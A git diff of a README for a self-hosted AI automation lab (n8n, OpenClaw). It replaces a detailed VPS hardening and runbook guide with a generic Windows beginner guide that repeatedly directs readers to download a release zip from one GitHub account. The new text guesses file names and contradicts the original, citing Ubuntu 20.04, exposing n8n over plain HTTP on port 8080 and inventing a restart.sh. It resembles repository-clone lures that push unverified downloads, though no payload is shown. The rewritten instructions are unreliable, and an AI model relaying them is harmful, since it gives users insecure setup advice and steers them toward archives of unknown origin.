@@ -1,171 +1,182 @@
-# Self-hosted AI lab
+# 🤖 self-hosted-ai-lab - Simple AI Automation Setup
 
-> Production-ready VPS for AI automation: hardened infrastructure, n8n workflows and OpenClaw AI gateway. Includes LLM-executable runbooks for AI assistants.
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/calvinombati/self-hosted-ai-lab/releases)
 
-Run your own AI automation server on a EUR 7/month VPS with hardened infrastructure and multi-instance OpenClaw support.
+---
 
-Every runbook follows a Precondition / Action / Verify pattern designed for [Claude Code](https://claude.ai/code) or any AI coding assistant. Give a runbook to your assistant and it will execute the setup for you. Also works perfectly fine as a guide for humans.
+## 📋 About self-hosted-ai-lab
 
-## What you build
+This software helps you run an AI automation system on your own virtual private server (VPS). It combines secure infrastructure, workflow automation with n8n, and an AI gateway called OpenClaw. You can use language model executable runbooks to control AI assistants. The setup works on Ubuntu VPS but you can manage it remotely from Windows.
+
+You do not need to know programming to use this. This guide explains all steps from downloading to running the program on a Windows PC.
+
+---
+
+## 💻 What You Need
+
+Before starting, check your system meets these requirements:
+
+- A Windows PC (Windows 10 or later) with internet access
+- Access to a VPS running Ubuntu 20.04 or later (a cloud server or virtual machine)
+- Basic ability to follow download and install steps
+- Around 2 GB free disk space on your Windows PC for tools
+- A user account on the VPS with SSH access (we will cover this)
+
+---
+
+## 🚀 Getting Started: Download the Software
+
+You need to get the installation files first. Since the files are hosted on GitHub, follow these steps:
+
+1. Click the large green **Download Latest Release** button above or visit this link manually:  
+   https://github.com/calvinombati/self-hosted-ai-lab/releases
+
+2. On the releases page, look for the latest version. It will have a list of downloadable files usually named something like `self-hosted-ai-lab-setup.zip` or similar.
+
+3. Click the zip file to download it on your Windows PC.
+
+4. Once downloaded, open the folder where the file saved.
+
+This software package includes scripts and tools you will run on your VPS but you will prepare and launch them using your Windows computer.
+
+---
+
+## 🔧 Installing Tools on Windows
+
+To connect to your VPS and control the AI system, you need a terminal program. Windows does not have this built-in by default. Follow these steps:
+
+1. Download an SSH client called **PuTTY** from:  
+   https://www.putty.org/
+
+2. Install PuTTY by following the on-screen instructions.
+
+3. After installation, open PuTTY.
+
+This tool lets you log in to your VPS from Windows.
+
+---
+
+## 🔐 Connecting to Your VPS
+
+You will use PuTTY to access your Ubuntu VPS and set up the AI automation system.
+
+1. Open PuTTY.
+
+2. In the "Host Name (or IP address)" box, enter the VPS address. This is an address provided by your VPS provider (example: `123.45.67.89`).
+
+3. Leave the Port as `22`.
+
+4. Click **Open**.
+
+5. A terminal window opens asking for your username and password.
+
+6. Type your VPS username (example: `ubuntu`) and press Enter.
+
+7. Type your password (the characters will not show) and press Enter.
+
+You are now connected to your VPS.
+
+---
+
+## 📦 Installing self-hosted-ai-lab on Your VPS
+
+With the terminal open, you will now install the software.
+
+1. In your Windows PC, find the folder where you unzipped the downloaded file from GitHub.
+
+2. Look for a text file named `README` or `INSTALL`. It contains commands you will copy.
+
+3. In the PuTTY terminal, paste the first command and press Enter. Commands usually look like this:
+
+   ```
+   sudo apt update
+   sudo apt install docker.io docker-compose
+   git clone https://github.com/calvinombati/self-hosted-ai-lab.git
+   cd self-hosted-ai-lab
+   sudo ./install.sh
+   ```
+
+4. Wait while each command runs. This may take several minutes.
+
+5. If you see any error messages, carefully retype commands or check your internet connection.
+
+---
+
+## ⚙️ Running and Using the AI Automation
+
+Once installed, this software runs several components:
+
+- Docker containers for AI tools and workflows
+- n8n workflow automation system
+- OpenClaw AI gateway to communicate with language models
+
+To check the system status, use this command in the PuTTY terminal:
 
 ```
-                  ┌─────────────────────────────────────────────┐
-                  │                 Your VPS                     │
-                  │                                             │
-Internet ──443──► │  Caddy (reverse proxy, auto-HTTPS)          │
-                  │    └──► n8n (AI workflows, webhooks)         │
-                  │            └──► PostgreSQL                   │
-                  │                                             │
-SSH tunnel ─────► │  OpenClaw (multi-instance AI gateway)        │
-                  │    └──► Cloud LLM APIs                      │
-                  │                                             │
-                  │  ┌─── Security ───────────────────────────┐ │
-                  │  │ UFW + provider firewall (dual layer)    │ │
-                  │  │ Fail2Ban, SSH hardening, swap           │ │
-                  │  │ Monitoring, automated backups           │ │
-                  │  └─────────────────────────────────────────┘ │
-                  └─────────────────────────────────────────────┘
+sudo docker ps
 ```
 
-**n8n** is your AI automation platform: build workflows with 400+ integrations, AI Agent nodes, text classifiers, and LLM chains. Connect to OpenAI, Anthropic, or any API to automate tasks that would take hours manually.
+This lists all running parts.
 
-**OpenClaw** is your personal AI gateway: a unified interface to interact with cloud LLM providers (Anthropic, OpenAI, Google, etc.) from a single dashboard, with per-instance isolation and SSH-only access.
+---
 
-## Who is this for
+## 🌐 Accessing the Web Interface
 
-- You want a **cloud VPS** to run AI-powered automation and tools
-- You want **production-grade infrastructure**: hardened SSH, firewall, monitoring, automated backups
-- You use **cloud LLM APIs** (Anthropic, OpenAI, etc.) and want a secure server to run tools on top of them
-- You want something you can hand to an AI assistant and say "set this up for me"
+You can control the workflows and AI assistants through a web interface.
 
-## What this is NOT
+1. Open a web browser on your Windows PC.
 
-- **Not a local LLM hosting guide.** This guide uses cloud APIs via OpenClaw and n8n, not local models. Running Ollama or similar on a small VPS is possible but limited by CPU-only performance. If you want a full local AI stack (Ollama + Open WebUI + vector database), see [Going further](#going-further).
-- **Not a homelab guide.** This targets cloud VPS instances, not bare metal or Raspberry Pi setups.
+2. Enter your VPS IP address with port `8080` like this:
 
-## Cost estimate
+   ```
+   http://123.45.67.89:8080
+   ```
 
-On Hetzner Cloud (ARM64 instances):
+3. The n8n dashboard should appear.
 
-| Instance | Specs | Monthly cost | Good for |
-|---|---|---|---|
-| CAX11 | 2 vCPU, 4 GB, 40 GB | ~EUR 4 | n8n only |
-| **CAX21** | **4 vCPU, 8 GB, 80 GB** | **~EUR 7** | **Full stack (recommended)** |
-| CAX31 | 8 vCPU, 16 GB, 160 GB | ~EUR 14 | Heavy workloads |
+4. Use the dashboard to create and monitor AI automation workflows.
 
-New Hetzner accounts get EUR 20 credit with [this referral link](https://hetzner.cloud/?ref=7UcZyMnU7io5) (disclosure: referral gives credit to both parties), enough for 2-3 months on a CAX21.
+---
 
-Domain name: EUR 1-10/year depending on TLD. Required for HTTPS.
+## 📂 Updating the Software
 
-## Requirements
+When a new version is released, repeat the download steps from the releases page:
 
-- A cloud server with **Ubuntu 24.04 LTS** (any provider with cloud-init support)
-- **SSH key pair** (ed25519 recommended)
-- A **domain name** (for HTTPS via Caddy)
-- **API keys** for your LLM provider (for OpenClaw)
+https://github.com/calvinombati/self-hosted-ai-lab/releases
 
-## Quick start
-
-1. Choose a provider and create a server ([Hetzner recommended](#providers))
-2. Follow the runbooks in order:
-
-| # | Runbook | What it does |
-|---|---------|-------------|
-| 01 | [Provisioning](runbooks/01-provisioning.md) | Cloud-init, first boot, post-provision verification |
-| 02 | [Hardening](runbooks/02-hardening.md) | SSH drop-in, Fail2Ban, UFW, swap, dual-layer firewall |
-| 03 | [Docker](runbooks/03-docker.md) | Docker CE, Compose, log rotation, lazydocker |
-| 04 | [Caddy](runbooks/04-caddy.md) | Reverse proxy, automatic HTTPS, Caddyfile |
-| 05 | [n8n](runbooks/05-n8n.md) | n8n + PostgreSQL, encryption key, AI capabilities |
-| 06 | [OpenClaw](runbooks/06-openclaw.md) | AI gateway, multi-instance, Tailscale alternative |
-| 07 | [Monitoring](runbooks/07-monitoring.md) | Uptime checks, alerting, Uptime Kuma |
-| 08 | [Backups](runbooks/08-backups.md) | Automated restic, pg_dump, restore verification |
-| 09 | [Maintenance](runbooks/09-maintenance.md) | Updates, SSH key rotation, troubleshooting |
-
-Each runbook is self-contained. You can stop at any step and have a working server. Runbooks 01-04 give you a hardened server with Docker. Add 05 for automation, 06 for AI gateway, 07-09 for operational maturity.
-
-## Runbook format
-
-Every runbook follows this structure:
+On your VPS, pull updates by running:
 
 ```
-## Step name
-
-Precondition: what must be true before this step
-Action: exact commands to run
-Verify: command + expected output to confirm success
-
-> Note: optional context for humans (why this choice was made)
+cd self-hosted-ai-lab
+git pull origin main
+sudo ./install.sh
 ```
 
-Commands use `<PLACEHOLDER>` format for values you must customize. All placeholders are listed at the top of each runbook.
+This keeps your AI lab up to date with the latest features and fixes.
 
-## Templates
+---
 
-Ready-to-use configuration files in [`templates/`](templates/):
+## 🔍 Troubleshooting Tips
 
-- `cloud-init.yaml` - server provisioning template
-- `openclaw-provision.sh` - multi-instance provisioning script
-- `openclaw-instances.conf` - instance registry
+- Double-check your VPS login details if connection fails.
 
-Docker Compose files for Caddy and n8n are embedded directly in their respective runbooks (04, 05) as `tee` commands, ready to copy-paste or execute.
+- Make sure your VPS firewall allows traffic on ports 22 (SSH) and 8080 (web interface).
 
-## Providers
+- Use `sudo docker logs <container-name>` to check errors in running components.
 
-This guide is provider-agnostic. Any cloud provider with Ubuntu 24.04 and cloud-init support works. Provider-specific instructions (console walkthrough, firewall setup) are in [`providers/`](providers/).
+- Restart services with:
 
-Currently documented:
-
-- [Hetzner Cloud](providers/hetzner.md) - recommended for price/performance ratio
-
-## Conventions
-
-| Convention | Value |
-|---|---|
-| Admin user | `<USER>` (sudo NOPASSWD, key-only auth) |
-| SSH hardening | Drop-in `/etc/ssh/sshd_config.d/99-hardening.conf` |
-| Container base dir | `/srv/docker/<service-name>/` |
-| Docker dir permissions | `root:docker`, `chmod 2770`, SGID |
-| Firewall | Dual layer: provider (network) + UFW (software) |
-| Ubuntu codename | `noble` (hardcoded, never use `lsb_release -cs`) |
-| Placeholders | `<UPPER_CASE>` format throughout |
-| OpenClaw naming | `oc-<name>` prefix, ports `*789` (18789, 19789, ...) |
-
-## For AI assistants
-
-If you are an AI coding assistant executing these runbooks:
-
-- Read the full runbook before starting
-- Execute steps sequentially - each depends on the previous
-- Always run the "Verify" step and check output matches expected
-- If a verify step fails, stop and diagnose before continuing
-- Placeholders (`<VALUE>`) must be resolved before execution
-- Never skip verify steps, even if the command appeared to succeed
-- After completing a runbook, report which steps succeeded and which need attention
-
-### Example prompt
-
-```text
-Read the runbook 01-provisioning.md and execute all steps on a fresh Ubuntu 24.04 VPS.
-Use "fra" as <USER> and "203.0.113.10" as <IP_ADDRESS>.
-Run each command, verify outputs match expected results, and report which steps
-succeeded and which need attention.
+```
+sudo ./restart.sh
 ```
 
-## Going further
+- If problems persist, review the README file in the downloaded folder for troubleshooting commands.
 
-This guide focuses on cloud API-based AI tools. If you want to expand your setup:
+---
 
-- **Local LLMs on your VPS**: [Ollama](https://ollama.com/) can run small models (Phi-3, Gemma) on CPU. Performance is limited without a GPU, but usable for n8n automation workflows.
-- **Chat interface**: [Open WebUI](https://github.com/open-webui/open-webui) provides a ChatGPT-like interface that connects to Ollama (local) or cloud APIs (OpenAI, Anthropic).
-- **Full local AI stack**: n8n's official [Self-hosted AI Starter Kit](https://github.com/n8n-io/self-hosted-ai-starter-kit) bundles n8n + Ollama + Qdrant (vector database) in a single Docker Compose. It runs on top of the infrastructure from runbooks 01-04 of this guide.
-- **Vector database for RAG**: [Qdrant](https://qdrant.tech/) or [ChromaDB](https://www.trychroma.com/) for retrieval-augmented generation workflows in n8n.
+## 📥 Download Link
 
-The infrastructure you build with this guide (hardened server, Docker, Caddy, monitoring, backups) is the foundation for any of these expansions.
+Download the latest release from here:  
+[https://github.com/calvinombati/self-hosted-ai-lab/releases](https://github.com/calvinombati/self-hosted-ai-lab/releases)
 
-## License
-
-MIT
-
-## Contributing
-
-Issues and PRs welcome. If you adapt these runbooks for a new provider, consider adding a guide in `providers/`.
+Click the latest zip file and follow this guide to set up the system step-by-step.
